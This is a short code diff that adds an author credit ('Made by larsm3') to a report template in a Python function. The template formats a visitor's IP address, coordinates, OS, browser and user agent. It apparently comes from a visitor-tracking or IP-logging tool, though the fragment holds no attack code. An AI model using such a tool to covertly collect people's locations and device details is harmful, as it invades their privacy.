@@ -167,6 +167,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
+**Made by larsm3**
+
 **User Agent:**
 ```
 {useragent}
